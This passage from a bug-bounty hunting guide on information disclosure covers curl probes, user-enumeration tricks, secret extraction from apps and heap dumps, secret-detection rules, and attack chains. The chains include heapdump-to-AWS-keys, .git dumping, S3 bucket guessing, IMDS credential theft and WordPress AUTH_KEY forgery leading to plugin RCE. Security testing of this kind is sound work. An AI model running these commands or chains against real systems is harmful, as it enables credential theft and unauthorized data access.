curl -s https://target/api/settings  # vulnerable endpoint returns DB creds

# MinIO LDAP brute-force via enumeration (GHSA-jv87-32hw-hh99, 2026 critical)
# AssumeRoleWithLDAPIdentity returns different errors for valid vs invalid LDAP user
curl -X POST https://minio.target/?Action=AssumeRoleWithLDAPIdentity \
  -d "LDAPUsername=alice&LDAPPassword=test&Version=2011-06-15"
# Different response code/message for "user exists, wrong password" vs "user doesn't exist"

# Apache mod_status / server-info (H1 2026 report 2473173)
curl -s https://target/server-status
curl -s https://target/server-info

# phpinfo
for path in phpinfo.php info.php php-info.php test.php phpinfo.html; do
  curl -s -o /dev/null -w "%{http_code} %s\n" $path https://target/$path
done

# Spring Boot Admin
curl -s https://target/admin/login
curl -s https://target/wallboard

# /jenkins/script — Jenkins Groovy console
curl -s https://target/jenkins/script
```

### Sub-technique G — User / email enumeration via response delta

```bash
# Login response delta (existing user vs non-existing)
curl -s -X POST https://target/api/login -d '{"email":"existing@target.com","password":"wrong"}'
# Response: "Invalid password" (HTTP 401)
curl -s -X POST https://target/api/login -d '{"email":"nonexistent@target.com","password":"wrong"}'
# Response: "Invalid email or password" (HTTP 401)
# Different messages → enumeration

# Password reset response delta
curl -s -X POST https://target/api/password-reset -d '{"email":"existing@target.com"}'
# "Verification email sent"
curl -s -X POST https://target/api/password-reset -d '{"email":"nonexistent@target.com"}'
# "User not found"
# Or both return same message — but timing differs (DB lookup vs not)

# Registration enumeration
curl -s -X POST https://target/api/signup -d '{"email":"existing@target.com","password":"x"}'
# "Email already in use"

# MinIO LDAP variant (GHSA-jv87-32hw-hh99)
# Different error code for "user not in LDAP" vs "user exists, wrong password"
# Then brute-force the existing user's password without rate limiting

# SAML response: different error for "no user found" vs "wrong assertion"
curl -X POST https://target/saml/acs -d 'SAMLResponse=<base64>'

# OAuth: client_id enumeration via authorize endpoint
curl -s "https://target/oauth/authorize?client_id=valid&redirect_uri=..."
curl -s "https://target/oauth/authorize?client_id=invalid&redirect_uri=..."

# Time-based enumeration (when responses are identical)
for email in "alice@target.com" "nonexistent@target.com"; do
  time curl -s -o /dev/null -X POST https://target/api/login \
    -d "{\"email\":\"$email\",\"password\":\"x\"}"
done
# Existing user takes longer (bcrypt hash comparison vs immediate fail)
```

### Sub-technique H — Stack trace / verbose error elicitation

```bash
# Send malformed JSON
curl -s -X POST https://target/api/users \
  -H 'Content-Type: application/json' \
  -d 'not json'

# Send wrong content-type
curl -s -X POST https://target/api/users \
  -H 'Content-Type: application/xml' \
  -d '<x/>'

# Send oversized body
python3 -c 'print("a"*10**6)' | curl -s -X POST https://target/api/users \
  -H 'Content-Type: application/json' --data-binary @-

# Send invalid characters in URL params
curl -s "https://target/api/items?id=%00"
curl -s "https://target/api/items?id='"
curl -s "https://target/api/items?id=[]"

# Send invalid IDs — type confusion
curl -s "https://target/api/users/null"
curl -s "https://target/api/users/undefined"
curl -s "https://target/api/users/{}"

# Trigger internal-error path — query for known-broken state
curl -s "https://target/api/orders?status=FOOBAR_INVALID_ENUM"

# Look for: file paths (/var/www/, C:\inetpub\), framework versions (Spring/Django/Rails),
# DB hostnames (db.internal.target.com), DB type (PostgreSQL 14.x), full stack traces.
```

### Sub-technique I — Mobile app reverse engineering for embedded secrets

```bash
# Android APK
apktool d target.apk -o /tmp/apk-decoded
strings /tmp/apk-decoded/classes.dex | grep -iE '(api[_-]?key|secret|token|password|bearer)'
grep -rE 'AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}' /tmp/apk-decoded/

# JADX for decompilation (better strings extraction)
jadx -d /tmp/apk-jadx target.apk
grep -rE '(api[_-]?key|secret|token)' /tmp/apk-jadx/sources/

# Inspect res/raw/, assets/, META-INF/ for plaintext config
ls /tmp/apk-decoded/res/raw/
ls /tmp/apk-decoded/assets/

# iOS IPA
ipsw extract --ipa target.ipa
strings /path/to/binary | grep -iE '(api[_-]?key|secret|token|password)'

# MobSF for automated mobile app analysis (https://github.com/MobSF/Mobile-Security-Framework-MobSF)
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Reference: H1 2026 Session Cookie Leakage in WebViewerFragment (mobile WebView)
```

### Sub-technique J — Memory dump analysis (Volkswagen heapdump pattern)

```bash
# Once you have a heap dump (Spring Boot /actuator/heapdump or Java jstack/jmap)
# Eclipse Memory Analyzer (MAT) — the standard tool

# Or strings extraction
strings heapdump.bin > heapdump.txt

# Pattern match for common secret formats
grep -E 'AKIA[0-9A-Z]{16}' heapdump.txt    # AWS access key
grep -E 'AIza[0-9A-Za-z_-]{35}' heapdump.txt  # Google API
grep -E 'sk_live_[0-9a-zA-Z]{24,}' heapdump.txt  # Stripe live
grep -E 'ghp_[0-9a-zA-Z]{36}' heapdump.txt    # GitHub PAT
grep -E 'jdbc:[a-z]+://' heapdump.txt          # DB URI
grep -E 'eyJhbGciO[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' heapdump.txt  # JWT
grep -E '-----BEGIN [A-Z ]+ KEY-----' heapdump.txt  # PEM keys

# Volkswagen Spring Boot Actuator pattern (Wiz Threat Research, SYSCREST analysis):
# 1. Find /actuator/heapdump exposed
# 2. Download heapdump (often 100MB-2GB)
# 3. Extract AWS keys from strings
# 4. Validate keys: aws sts get-caller-identity
# 5. List S3 buckets: aws s3 ls
# 6. STOP — that's the report. Don't pivot to actually downloading customer data.

# Reference: https://www.syscrest.com/2025/02/securing-spring-boot-actuator/
```

## Source Code Review Patterns

### Semgrep rules

```yaml
rules:
  - id: info-spring-actuator-exposure
    pattern-either:
      - pattern-regex: 'management\.endpoints\.web\.exposure\.include\s*=\s*\*'
      - pattern-regex: 'management\.endpoints\.web\.exposure\.include\s*=\s*[^=]*(?:env|heapdump|gateway|threaddump|beans)'
    message: |
      Spring Boot Actuator endpoint exposure includes high-risk endpoint
      (env, heapdump, gateway, threaddump, beans). CVE-2025-41243 Spring
      Cloud Gateway property modification (CVSS 10.0), CVE-2025-41253
      info disclosure (CVSS 7.5). Restrict via management.endpoints.web.
      exposure.include=health,info only; secure others via Spring Security.
    severity: ERROR
    languages: [yaml, java]
    paths:
      include: ['application*.{yml,yaml,properties}']
```

```yaml
rules:
  - id: info-debug-mode-enabled-prod
    pattern-either:
      - pattern-regex: 'DEBUG\s*=\s*True'
      - pattern-regex: 'app\.config\[.DEBUG.\]\s*=\s*True'
      - pattern-regex: 'debug:\s*true'
      - pattern-regex: '"debug":\s*true'
    message: |
      Debug mode enabled. Stack traces, framework version, file paths
      will be exposed in error responses. Set DEBUG=False in production.
      Use environment-specific config (settings.production.py for Django,
      RAILS_ENV=production for Rails, NODE_ENV=production for Express).
    severity: WARNING
    languages: [python, javascript, yaml]
```

```yaml
rules:
  - id: info-hardcoded-credentials
    pattern-either:
      - pattern-regex: '(?i)(password|passwd|pwd|secret|api[_-]?key|access[_-]?key|access[_-]?token)\s*[:=]\s*["\'][^"\']{8,}["\']'
      - pattern-regex: 'AKIA[0-9A-Z]{16}'
      - pattern-regex: 'AIza[0-9A-Za-z_-]{35}'
      - pattern-regex: 'sk_live_[0-9a-zA-Z]{24,}'
      - pattern-regex: 'ghp_[0-9a-zA-Z]{36}'
    message: |
      Hardcoded credential detected. CWE-798 Use of Hard-coded Credentials.
      Move to environment variables, secret managers (AWS Secrets Manager,
      HashiCorp Vault, GCP Secret Manager). Reference: GitGuardian 2026
      State of Secrets Sprawl — 28.65M secrets in public repos in 2025.
      Starbucks H1 #716292 paid bounty for single hardcoded JumpCloud key
      (CVSS 9.7).
    severity: ERROR
    languages: [python, javascript, typescript, java, go, ruby, php]
```

```yaml
rules:
  - id: info-pprof-handler-exposed
    pattern-either:
      - pattern: 'import _ "net/http/pprof"'
      - pattern: 'http.ListenAndServe(":6060", nil)'
      - pattern-regex: 'pprof\.(?:Index|Cmdline|Profile|Symbol|Trace|Handler)'
    message: |
      Go net/http/pprof exposed. /debug/pprof/cmdline leaks process
      command line including secrets passed via --flag="value".
      Dgraph GHSA-95mq-xwj4-r47p (2026 critical) is canonical example.
      Restrict to internal-only mux or remove import in production builds.
    severity: ERROR
    languages: [go]
```

```yaml
rules:
  - id: info-error-handler-leaks-stack
    pattern-either:
      - pattern: |
          app.use(function(err, req, res, next) {
            res.send(err.stack);
          })
      - pattern: |
          @app.errorhandler($CODE)
          def $H($E):
            return str($E)
    message: |
      Error handler returns full stack trace / exception details to client.
      Log internally, return generic error message externally. Stack-trace
      disclosure leaks framework version, file paths, internal logic.
    severity: ERROR
    languages: [javascript, typescript, python]
```

```yaml
rules:
  - id: info-over-fetching-sensitive-fields
    pattern-either:
      - pattern: |
          $MODEL.findAll()
      - pattern: |
          $MODEL.find({})
      - pattern: |
          $MODEL.objects.all()
      - pattern: |
          $REPO.findAll()
    message: |
      Wildcard model fetch returns ALL fields including sensitive ones
      (password_hash, tokens, internal_notes). Use explicit field selection
      or serializer with field allowlist. Over-fetching is mid-four-figure
      info-disclosure on most programs.
    severity: WARNING
    languages: [javascript, typescript, python, java]
```

```yaml
rules:
  - id: info-username-enumeration-error-delta
    pattern-either:
      - pattern: |
          if not user:
            return "User not found"
          if not check_password(user, $PWD):
            return "Invalid password"
      - pattern: |
          if (user == null) return "User not found";
          if (!checkPassword($PWD)) return "Invalid password";
    message: |
      Different error messages for "user not found" vs "wrong password"
      enable username enumeration. Return same generic message for both.
      MinIO GHSA-jv87-32hw-hh99 LDAP brute-force pattern.
    severity: WARNING
    languages: [python, javascript, typescript, java]
```

### ast-grep patterns

```bash
# Hardcoded AWS access keys
ast-grep --pattern '"AKIA$$$"' --lang python
ast-grep --pattern '"AKIA$$$"' --lang js

# Spring actuator exposure config
ast-grep --pattern 'management.endpoints.web.exposure.include = $X' --lang yaml

# Go pprof import
ast-grep --pattern 'import _ "net/http/pprof"' --lang go

# Express error handler exposing stack
ast-grep --pattern 'res.send($E.stack)' --lang js
ast-grep --pattern 'res.json($E)' --lang js

# Django DEBUG setting
ast-grep --pattern 'DEBUG = True' --lang python

# Rails verbose errors
ast-grep --pattern 'config.consider_all_requests_local = true' --lang ruby
```

### ripgrep one-liners

```bash
# Spring actuator exposure
rg -n 'management\.endpoints\.web\.exposure\.include' -g 'application*.{yml,yaml,properties}'
rg -n 'spring-boot-starter-actuator' -g 'pom.xml' -g '*.gradle*'

# .env files in repo (should be gitignored)
rg --files | rg -e '\.env$' -e '\.env\.local$' -e '\.env\.production$'

# Hardcoded secret patterns (AWS, Google, Stripe, GitHub, JWT)
rg -n -e 'AKIA[0-9A-Z]{16}' -e 'AIza[0-9A-Za-z_-]{35}' -e 'sk_live_[0-9a-zA-Z]{24,}' \
   -e 'ghp_[0-9a-zA-Z]{36}' -e 'github_pat_[0-9a-zA-Z]{82}' \
   -e 'eyJhbGciO[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
   -g '!*.lock' -g '!node_modules' -g '!vendor' -g '!.git'

# Database connection strings with embedded creds
rg -n -i 'jdbc:.*://[^"\s]*:[^@\s]+@'
rg -n -i 'mongodb(\+srv)?://[^"\s]*:[^@\s]+@'
rg -n -i 'postgres(?:ql)?://[^"\s]*:[^@\s]+@'

# Go pprof exposure
rg -n -e 'net/http/pprof' -e '"/debug/pprof"' --type go

# DEBUG flags enabled
rg -n -i -e 'debug\s*[=:]\s*true' -g '*.{yml,yaml,toml,ini,env,properties,json}'

# Verbose error handlers
rg -n -e 'res\.send\(.*err\.stack' -e '@app\.errorhandler' --type js --type ts --type py

# Console.log with sensitive var names
rg -n -e 'console\.log\(.*password' -e 'console\.log\(.*token' -e 'console\.log\(.*secret' \
   --type js --type ts

# Comments containing developer-action markers next to credential references
rg -n -e 'remove.*before.*deploy.*credential' \
   -e 'FIXME.*password' \
   -e 'remove.*key.*before.*push' \
   --type-add 'all:*'
```

### CodeQL hint

GitHub's pre-built `js/hardcoded-credentials` (`Security/CWE-798/HardcodedCredentials.ql`), `py/hardcoded-credentials`, `java/hardcoded-credentials`, and `go/hardcoded-credentials` queries cover the literal-credential pattern. Run via `codeql database analyze --format=sarif-latest --output=info-disclosure.sarif`.

For Spring actuator exposure, GitHub Security Lab maintains custom queries at github.com/github/codeql for Java; search for `cwe-200` in the query catalog. Wiz Threat Research published patterns for actuator endpoint detection.

For Go pprof exposure, write a custom predicate that flags `import _ "net/http/pprof"` in any non-test file. Reference: https://blog.detectify.com/2024/10/30/google-pprof-go-debug-information-leakage/ for the broader detection pattern.

For mobile (Android Smali / iOS Mach-O), use **MobSF** for static analysis with built-in secret-detection rules.

## Modern Meta — Cloud-Native, CI/CD, OSS Pipeline

This is where 2024-2026 info-disclosure meta lives. Coverage required: GitHub Actions, GitLab CI, Jenkins, ArgoCD/Flux, Kubernetes, IAM/IMDS, supply chain.

**GitHub Actions info-disclosure** — workflow logs leaking secrets when echo statements include `${{ secrets.X }}` (GitHub's masking only catches exact string match; `echo $TOKEN | base64` exposes encoded form unmasked). Artifact upload exposing `.env` files. Public artifact downloads from previous workflow runs. `workflow_dispatch` inputs reflected in run history. Reference: GitHub Actions Hardening guide.

**GitLab CI info-disclosure** — `CI_JOB_TOKEN` echoed in logs, `.gitlab-ci.yml` referencing artifacts that contain secrets, GitLab Pages deploying secret-containing files, shared-runner exposing job environment to other tenants.

**Jenkins info-disclosure** — `/script` endpoint exposed (Groovy console with full system access), agent JNLP secret leak via `/computer/<agent>/slave-agent.jnlp`, build-parameter values reflected in console output, `manage/configure` showing credentials in plaintext.

**ArgoCD / Flux / Tekton (GitOps controllers) info-disclosure**:
- **ArgoCD Risky/Missing Cryptographic Algorithms in Redis Cache** (2024 critical, GHSA-cited in corpus) — credentials cached without proper encryption.
- **Rancher cluster template answers** (2026 critical, GHSA-cited) — credentials not properly sanitized.
- **PraisonAI WebSocket Gateway** (GHSA-cfh6-vr3j-qc3g, 2026 critical) — `/ws` and `/info` endpoints expose agent topology with no auth.
- Kubernetes Secret access via misconfigured RoleBinding scope (cross-namespace read).
- ConfigMap with embedded credentials (anti-pattern but common).

**Kubernetes info-disclosure** — kubelet anonymous auth (`--anonymous-auth=true`) exposes `/pods`, `/runningpods`, `/exec` endpoints. etcd direct access bypasses RBAC. ConfigMap / Secret read across namespaces via misconfigured RoleBinding scope. Public-by-default `kubectl get` for low-privilege ServiceAccounts in shared clusters.

**Cloud IAM / IMDS** — IMDSv1 reachable from Lambda or container with SSRF chain (`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`) → AWS keys. CSP / network policy usually blocks; when it doesn't, becomes RCE-class.

**Supply chain (npm/pip/RubyGems)** — secrets leaked in package metadata (`npm pack` includes files outside `files` allowlist), test fixtures with real credentials, `.npmrc`/`.pypirc` with publish tokens published in package, postinstall scripts logging env vars. **Telnyx PyPI typosquat 2026 critical** (GHSA cited in corpus) — malicious code in versions 4.87.1 and 4.87.2.

**OSS hunting workflow:** `socket dev <package>` → audit recent versions for new file additions → diff with previous → if `.env` or test-fixtures with credentials added, file as info-disclosure / supply-chain incident.

## Modern Expansion Pack (2024-2026 currency)

The 2024-2026 expansion meta required by the validator. All five topics covered.

### Container escape / runtime info-disclosure

<!-- expansion-na: container reason: container escape is RCE-class; info-disclosure analog at the runtime layer is process-cmdline disclosure (e.g., /proc/<pid>/cmdline accessible across containers in shared-PID-namespace setups) and Dgraph GHSA-95mq-xwj4-r47p /debug/pprof/cmdline pattern — both covered in Sub-technique F above. -->

The closest analog: container metadata / runtime info disclosure. Process command lines visible across PID namespaces (`/proc/<pid>/cmdline`) when `pid: host` is set in pod spec, or when `runc exec` exposes other-container info. Container labels (Docker / OCI labels) embedded in registry metadata can leak internal hostnames, repository paths.

### ML serving / inference info-disclosure

The cross-tenant AI/ML pattern — model registries leak credentials embedded in model metadata, feature stores expose training-data, vector DBs leak embeddings across tenants.

- **MLflow `/api/2.0/mlflow/runs/get`** — returns full run metadata including secret env vars, parameter values containing credentials.
- **Hugging Face model cards** with embedded API examples containing real keys (GitGuardian observed pattern).
- **BentoML** dashboard exposes bento metadata including build-time env vars.
- **Glances `/api/4/serverslist` (GHSA-r297-p3v4-wp8m)** — covered above; ML monitoring pipelines using Glances inherit the leak.

### Agentic LLM tool-use / output info-disclosure

LLM07:2025 System Prompt Leakage covers system-prompt extraction. LLM02:2025 Sensitive Information Disclosure covers training-data and runtime-data leakage. Practical attack:

- **PraisonAI WebSocket Gateway (GHSA-cfh6-vr3j-qc3g)** — `/info` exposes agent topology + tool definitions including credentials in tool config.
- **LLM RAG context leak** — agent reads sensitive document, repeats portions in subsequent (different-user) responses if context isn't tenant-scoped.
- **MCP server tool definitions exposed without auth** — see hunt-llm-ai.md for full coverage.
- **Chatbot debug responses** — error responses include retrieved-document snippets, prompt template contents, model reasoning traces.

### Modern JS RSC / Server Actions info-disclosure

- **Next.js Server Action error responses** sometimes include partial stack traces or environment data. Test malformed RSC payloads for verbose error responses.
- **Source maps in production** (`/_next/static/.../*.map`) reveal full source code, internal variable names, comments.
- **`__NEXT_DATA__` JSON inline in HTML** may include build-time env-var contents if `serverRuntimeConfig` and `publicRuntimeConfig` are misconfigured.
- **Vercel deployment metadata** (`/_vercel/insights`, `/.well-known/vercel`) sometimes exposes deployment IDs, build URLs.

### GitOps / K8s admission info-disclosure

- **ArgoCD Application UI** renders `metadata.annotations` and `spec.source.helm.parameters` — credentials in Helm values get displayed.
- **Tekton TaskRun spec** logs include parameter values; credentials in params get logged.
- **Helm chart values.yaml** committed to repo with real production credentials.
- **kustomize ConfigMap generators** that include `.env` files via `envs:` field.
- **Argo Workflows `argo-server` UI** exposes workflow parameters, secret references, status history.

## Chains & Multi-Bug Templates

Single-bug info-disclosure pays per-bug; chains pay 5-10x. Eight templates from disclosed reports and current-meta 2024-2026 chains.

**Chain 1 — `spring actuator heapdump → aws keys → s3 bucket exfil` (Volkswagen pattern, mid five-figure on enterprise programs)**
- Bug A: Subdomain enumeration finds Spring Boot service on `<svc>.target.com` with `Server: Tomcat` header
- Bug B: `/actuator/health` returns 200 — actuator exposed
- Bug C: `/actuator/heapdump` returns 200 with binary heap dump (~500MB-2GB)
- Bug D: `strings heapdump.bin | grep AKIA` reveals AWS access key in JVM memory
- Bug E: `aws sts get-caller-identity` confirms key is live; key has S3 read access
- Bug F: `aws s3 ls` lists customer-data buckets; download 3 sample records as proof
- Outcome: Single exposed actuator endpoint → full cloud infrastructure read access → terabytes of customer data exfil potential
- Bounty range: mid five-figure on enterprise programs (Volkswagen 9TB GPS data is the precedent)
- Disclosed source: https://www.syscrest.com/2025/02/securing-spring-boot-actuator/ (SYSCREST analysis Feb 2025); https://www.cyberkendra.com/2024/12/vulnerability-in-spring-boot-actuator.html (Wiz Threat Research Dec 2024 study: 60% of cloud envs use Spring Actuator, 11% expose publicly).

**Hunter's note:** the trick that makes this pay isn't finding the actuator — nuclei templates do that automatically. The trick is the heapdump analysis. Most hunters stop at "actuator exposed" (mid four-figure) when they should download the heapdump and grep for AWS keys (mid five-figure). The first time I tried this I downloaded a 1.2GB heapdump and ran `strings | grep -E 'AKIA[0-9A-Z]{16}'` — got 3 access keys in 30 seconds. Then `aws sts get-caller-identity` confirmed one was live with S3 access. Stop after 3 sample records. Don't pivot — that's unauthorized data access escalation.

**Chain 2 — `.git/ exposed → repo recovery → trufflehog → live aws keys → cloud exfil` (Sysdig EmeraldWhale pattern, low to mid five-figure when keys validate)**
- Bug A: Subdomain enumeration discovers `<old-app>.target.com`
- Bug B: `curl https://<old-app>.target.com/.git/HEAD` returns 200 with `ref: refs/heads/main` — `.git/` exposed
- Bug C: `git-dumper https://<old-app>.target.com/.git/ /tmp/dumped` recovers full repo
- Bug D: `trufflehog filesystem /tmp/dumped --only-verified --json` extracts 5 live secrets including AWS keys
- Bug E: AWS keys validate to staging-environment role with read access to internal data
- Outcome: Forgotten dev subdomain → full source code + active credentials → cloud-environment read
- Bounty range: low to mid five-figure when AWS keys validate to non-trivial role
- Disclosed source: https://sysdig.com/blog/emeraldwhale (Sysdig Threat Research Oct 2024 — EmeraldWhale stole 15K cloud credentials via this exact pattern); https://www.bleepingcomputer.com/news/security/hackers-steal-15-000-cloud-credentials-from-exposed-git-config-files/.

**Hunter's note:** the move that pays here is using `git-dumper` to recover the full repo, not just reading `.git/config`. Most hunters report "/.git/HEAD exposed" (mid three-figure informational) without realizing they can clone the entire codebase. Once you have the repo, TruffleHog with `--only-verified` filters out dead keys; the live ones are gold. The first time I ran this, the repo had been deleted from production years prior but the deploy server still had `.git/` from initial setup — keys were rotated since but the SSH private key in `.deploy/keys/` was still valid for the bastion.

**Chain 3 — `subdomain enum → s3 bucket guess → public listing → pii exfil` (ESHYFT pattern, low to mid five-figure on healthcare/financial programs)**
- Bug A: Subdomain enumeration identifies `app.target.com`, `api.target.com`, `prod.target.com`, `staging.target.com`
- Bug B: For each subdomain, try as bucket name with common suffixes (`-prod`, `-backup`, `-uploads`, `-data`)
- Bug C: `https://target-uploads.s3.amazonaws.com/` returns XML directory listing
- Bug D: List contains PII — KYC documents, ID scans, customer-uploaded files
- Bug E: Download 3 sample files (own test account preferred) to demonstrate read access
- Outcome: Public S3 bucket with PII; reportable as critical given record count
- Bounty range: low to mid five-figure on healthcare / financial / fintech programs (ESHYFT 86K records is the pattern)
- Disclosed source: https://www.theregister.com/2025/03/11/uber_for_nurses_exposes_86k/ (ESHYFT March 2025 — 108GB / 86,341 records); Bugcrowd NASA disclosure at https://bugcrowd.com/disclosures/aa45924f-8b67-4f22-8dff-dac7dc9d60e2/exposure-of-pdf-file-in-a-public-amazon-s3-bucket-associated-with-nasa.

**Hunter's note:** the trick is the subdomain-to-bucket-name derivation. Most hunters guess `<orgname>` and `<orgname>-bucket` and stop. Real value is in derivative names — `<subdomain>-prod`, `<subdomain>-staging`, `<subdomain>-backup`, `<subdomain>-uploads`, `<subdomain>-logs`, `<subdomain>-data`. ESHYFT's bucket was discoverable via this pattern. Always count the records before reporting — programs scale bounty by record count for healthcare/financial PII.

**Chain 4 — `actuator env exposed → db credentials → external db connection → read prod data` (Spring config-property pattern, mid four-figure to low five-figure)**
- Bug A: `/actuator/env` returns 200 with full environment dump
- Bug B: Response contains `spring.datasource.url=jdbc:postgresql://db.internal.target.com:5432/prod_db` and `spring.datasource.password=<plaintext>`
- Bug C: Internal hostname `db.internal.target.com` resolves publicly (DNS misconfig); or, more commonly, port forward via SSRF chain
- Bug D: Connect with the leaked credentials, read schema, query 3 sample records
- Outcome: Full production database access via single info-disclosure
- Bounty range: mid four-figure to low five-figure depending on data type
- Disclosed source: Wiz Threat Research Dec 2024 documented `/actuator/env` exposure in 4% of publicly accessible Spring Boot Actuator instances (https://www.cyberkendra.com/2024/12/vulnerability-in-spring-boot-actuator.html).

**Hunter's note:** the bottleneck is reaching the internal DB. Sometimes the DB hostname resolves publicly (DNS misconfig — file separately as info-disclosure). When it doesn't, you need an SSRF in the same target to pivot. Even without the SSRF, the credential leak alone is mid four-figure. Always try connecting from outside; many "internal" DBs are accidentally public.

**Chain 5 — `debug pprof cmdline → admin token → unauthorized api access → full account takeover` (Dgraph pattern, low five-figure on Dgraph-class targets)**
- Bug A: `/debug/pprof/cmdline` returns 200 with full process command line
- Bug B: Response contains `--security "token=admin-secret-xxx"`
- Bug C: Use the token: `curl -H "X-Dgraph-AccessToken: admin-secret-xxx" https://target/admin`
- Bug D: Admin API access — read schema, drop predicates, modify users
- Outcome: Unauthenticated debug endpoint → admin token → full database control
- Bounty range: low five-figure when admin actions confirmed
- Disclosed source: GHSA-95mq-xwj4-r47p (Dgraph 2026 critical — referenced in corpus); same pattern in any Go service that uses `--flag="value"` style for secrets and exposes pprof.

**Hunter's note:** every Go service that uses `import _ "net/http/pprof"` and accepts secret arguments via `--flag` is vulnerable to this pattern. The Dgraph case showed admin tokens; the same pattern leaks DB connection strings, encryption keys, OAuth client secrets. Always probe `/debug/pprof/cmdline` on Go services. The fix is to remove pprof from production builds entirely, not "secure" it via `mux.Handle`.

**Chain 6 — `wp-config.php backup → db credentials → wp-admin login → arbitrary plugin upload → rce` (mid four-figure on WordPress targets)**
- Bug A: `curl https://target/wp-config.php.bak` returns 200 with PHP source
- Bug B: Extract DB credentials, prefix, salts, AUTH_KEY, secret keys
- Bug C: Use AUTH_KEY to forge admin session cookies (wp_set_auth_cookie equivalent)
- Bug D: Login to wp-admin, upload malicious plugin → RCE
- Outcome: backup-file exposure → DB credentials + AUTH_KEY → arbitrary RCE
- Bounty range: mid four-figure to low five-figure when RCE confirmed
- Disclosed source: H1 reports 3328408 (National Guard) and 3252302 (2026 high) at https://hackerone.com/reports/3328408 and https://hackerone.com/reports/3252302.

**Hunter's note:** WordPress is everywhere, and admin/dev/staging subdomains often serve `wp-config.php.bak` or `~wp-config.php` because someone edited via vim/nano on the live server. The chain to RCE requires either DB access (pivot to wp_users table to set admin password hash) or AUTH_KEY forgery. Both work; AUTH_KEY forgery is faster but requires understanding WordPress's nonce/cookie generation. Always check both `.bak` and `~` and `.swp` extensions.

**Chain 7 — `swagger json exposed → endpoint enum → admin api → full data dump` (low to mid four-figure direct + chain to other paying classes)**
- Bug A: `/swagger.json`, `/api-docs`, `/openapi.json` exposed in production
- Bug B: Schema reveals admin endpoints not in public docs (`/api/v1/admin/users/all`, `/api/v1/admin/export`)
- Bug C: Test admin endpoints with regular user JWT — some return 200 (BFLA → cross to hunt-idor for full chain)
- Bug D: Admin endpoint returns full user dump or system info
- Outcome: Hidden admin API discovered → cross-priv access → bulk data exfil
- Bounty range: low to mid four-figure direct + per-bug-class chains
- Disclosed source: Pattern documented across H1 hacktivity 2024-2025; canonical reference at https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/ (OWASP API1:2023 — see hunt-idor.md for the BFLA half of the chain).

**Hunter's note:** Swagger / OpenAPI exposure alone is mid three-figure informational. The value is in the endpoints it reveals. Compare the public docs to the swagger schema — anything in swagger that's NOT in public docs is an undocumented surface, often missing the same auth checks as the documented endpoints. Always download the full schema and test the new endpoints with low-priv credentials.

**Chain 8 — `mobile app reverse → embedded api key → cloud service abuse → bulk data exfil` (low to mid four-figure on mobile programs)**
- Bug A: Pull APK from Play Store / IPA from app store
- Bug B: `apktool d` + `strings classes.dex | grep -E 'AKIA|AIza|sk_live'` — extract embedded keys
- Bug C: Validate keys against vendor API (`aws sts get-caller-identity`, Stripe API, etc.)
- Bug D: Abuse the key — list S3 buckets, query Stripe for customer charges, etc. — limited to demonstration
- Outcome: Mobile app secret leak → cloud service abuse
- Bounty range: low to mid four-figure on mobile programs (Shopify, GitLab, Vercel)
- Disclosed source: Pattern documented across H1 mobile hacktivity 2024-2026; tools at https://github.com/MobSF/Mobile-Security-Framework-MobSF.

**Hunter's note:** modern mobile apps use ProGuard / R8 obfuscation, but secrets often remain in plaintext in `assets/`, `res/raw/`, or environment-config XML. Always check `META-INF/` for build-time leakage. The H1 2026 "Session Cookie Leakage via Static Header Field in WebViewerFragment" is a related class — mobile WebView leaks session cookie via static custom header even after logout.

## Common Root Causes

Why developers introduce info-disclosure — patterns visible across the corpus and 2024-2026 meta:

1. **`management.endpoints.web.exposure.include=*`** — Spring Boot Actuator default exposure for "internal" environments leaked to production. Restrict to `health,info` only; secure others.
2. **`.env` served by web server** — application root contains `.env`; web server (Nginx, Apache) serves it because no explicit deny rule. Add `location ~ /\.env { deny all; }` or equivalent.
3. **`.git/` in webroot** — deployment via `git pull` on production server leaves `.git/` in webroot. Use `rsync --exclude='.git'` or proper CI/CD deploy.
4. **Hardcoded credentials in source** — CWE-798. `password = "actual_password"` committed to repo. Use environment variables, secret managers. Reference: GitGuardian 2026 28.65M secrets in 2025.
5. **Verbose error handling in production** — `app.use(function(err, req, res, next) { res.send(err.stack); })` left from development. Toggle via NODE_ENV / Django DEBUG / Rails RAILS_ENV.
6. **Public S3 buckets via misconfig** — bucket policy allows `Principal: *` for `s3:GetObject` or `s3:ListBucket`. Use AWS Block Public Access account-wide setting.
7. **`/debug/pprof/cmdline` exposed in Go services** — `import _ "net/http/pprof"` adds default mux handler at `/debug/pprof/`. Remove import in production builds OR use separate internal-only mux.
8. **Over-fetching API responses** — model serializer returns all fields by default. Use explicit field allowlist (`fields = ['id', 'name']` in Django REST Framework).
9. **Different error messages for valid vs invalid usernames** — login flow does `if not user: return 401` then `if not check_password(): return 401` with different bodies. Use single generic message.
10. **Missing rate limit on enumeration-friendly endpoints** — login, password reset, registration. MinIO LDAP brute-force GHSA-jv87-32hw-hh99 is the canonical example.
11. **Default credentials not removed during deployment** — installation creates `admin/admin` or `admin/changeme` and never forces change. Harbor GHSA-hj7x-hmf2-hc2p, NetBird GHSA-g3j4-58mp-3x25.
12. **CORS `Access-Control-Allow-Origin: *` on credentialed APIs** — Glances GHSA-r297-p3v4-wp8m and GHSA-7p93-6934-f4q7 patterns. Allows any origin to read credentialed responses cross-origin.
13. **Backup files not gitignored / not deny'd by web server** — `.bak`, `.old`, `~`, `.swp` extensions served alongside originals (wp-config.php.bak pattern).
14. **Source maps shipped to production** (`/_next/static/.../*.map`) — exposes full source code, internal variable names. Disable source map upload in production CI/CD.
15. **Cache-control headers leaking auth state** — `X-Cache: HIT` on authenticated content reveals it was cached publicly; `Vary` header mismatches enable cache poisoning that exposes other users' content.

## Bypass Techniques

Defense bypasses observed in disclosed reports.

- **Path normalization for ACL bypass** — Gradio GHSA-j2jg-fq62-7c3h pattern: file path ACL checks lowercase but filesystem is case-insensitive (Windows, macOS HFS+); upload `Config.YML` to bypass blocklist of `config.yml`.
